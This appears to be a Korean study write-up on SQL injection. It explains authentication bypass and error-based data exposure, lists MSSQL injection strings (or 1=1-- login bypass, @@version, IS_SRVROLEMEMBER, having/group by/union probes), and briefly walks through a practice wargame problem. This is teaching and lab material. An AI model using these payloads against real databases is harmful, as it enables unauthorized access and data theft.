기술문서 4주차
=======
SQL Injection 공격
--------
<br>
SQL Injection이란?
<br><br><img width="617" alt="default" src="https://user-images.githubusercontent.com/40850499/43365173-92f7927a-9363-11e8-847f-8a7e876862b2.PNG">


1. SQL Injection이란 웹 해킹의 기법 중 하나임 (web application 단계에서 일어남)
2. 웹 어플리케이션의 뒷단에 있는 데이터베이스에 쿼리를 보내는 과정 사이에 일반적인 값 외에 악의적인 의도를 갖는 구문을 삽입하여 공격자가 원하는 SQL 쿼리문을 실행하는 기법임

        SQL Injection 공격의 종류?

        1. 인증 우회
        2. 데이터 노출
        3. 원격명령 실행

 > 인증 우회와 데이터 노출을 실습해볼것임

 로그인 인증 우회란?<br>
 → 웹 사이트에 회원가입 된 ID / PW 를 사용하는 것이 아닌 SQL query 를 입력하여 로그인을 우회함

 <br>
 정상적인 로그인 인증 과정<br>
 <img width="626" alt="default" src="https://user-images.githubusercontent.com/40850499/43365158-5880a636-9363-11e8-90cc-079290612071.PNG">

<br><br>SQL query를 통한 비정상적 인증 과정<br>
<img width="616" alt="default" src="https://user-images.githubusercontent.com/40850499/43365166-6fbe9506-9363-11e8-9803-e548c181a8aa.PNG">
<br>

SQL Injection 우회 기법
<br><br>
1.select * from where id = ‘ ’ or ‘ ’ = ‘’ and pass = ‘ ’ or ‘ ’ = ‘ ’

2.select * from where id = ‘ ’ or 1 = 1—’ and pass = ‘ ’
<br>

      데이터 노출이란?

      1.타겟 시스템의 주요 데이터 절취를 목적으로 하는 방식

      2.시스템의 에러는 개발자에게 버그를 수정하는 면에서 많은 도움을 주지만 역으로 에러를 이용할 수 있음
          → (악의적인 구문을 삽입하여 에러를 유발)


      데이터 노출이 위험한 이유?
      → 해커는 GET 방식으로 동작하는 url에 추가적인 ‘query string’을 추가하여 에러를 발생시킬 수 있음.
      이에 해당하는 오류가 나타난다면 그것을 가지고 데이터베이스의 구조를 유추할 수 있음.
그러므로 오류 메시지 또는 페이지가 노출되어서는 안됨

>오류 메세지는 80040E14, 80040e07 두 가지가 제일 대표적임


- DBMS 버전 확인
    ☞ and 1=(select @@version)

 - 권한 확인
    ☞ and 1=(IS_SRVROLEMEMBER(‘sysadmin’))

 - DB 계정 권한 확인
    ☞ and 1=(IS_MEMBER(‘db_owner’))

 - DB 이름 확인
    ☞ and 0<>db_name()

 - DB 사용자 확인
    ☞ and user>0

 - DB 확인
    ☞ and 1=(select name from master.dbo.sysdatabases where dbid=1)

- DB Table 및 첫번째 Field 확인
    ☞ ‘ having 1=1--

 - DB Table Field 확인
    ☞ ‘ group by Table.1stField having 1=1--

 - DB Table Field Type 확인
    ☞ ‘ union select sum(Field) from Table --

정리 끝
이제 문제를 풀어보자

los 1번 문제<br>

<br>간단한 sql 기법과 php언어만 안다면 쉽게 풀 수 있는 문제임
<img width="609" alt="los 1" src="https://user-images.githubusercontent.com/40850499/43367810-f2ede5a6-938d-11e8-9c17-024a01967ac7.PNG">

그래도 다양한 시도를 한척 하기 위해
<br>
id = jiuyn pw = 1234를 넣어봄<br>
<img width="435" alt="1" src="https://user-images.githubusercontent.com/40850499/43367785-a7faaa20-938d-11e8-825d-51c19606cecc.PNG">
<br> 당연히 풀리지 않음
<br>
<img width="439" alt="los 1" src="https://user-images.githubusercontent.com/40850499/43367825-141a0c6e-938e-11e8-8797-892d424b5452.PNG">
<br>
DB에 존재하는 id 값을 넣어주면 바로 풀리는 문제라고 깨닫고 인증 우회 기법을 사용해줌<br>
id에 admin을 넣어주고 그 뒤로 나오는 모든 값을 주석처리 해줌<br>
어렵지 않게 풀리는 것이 확인 가능함

끝!
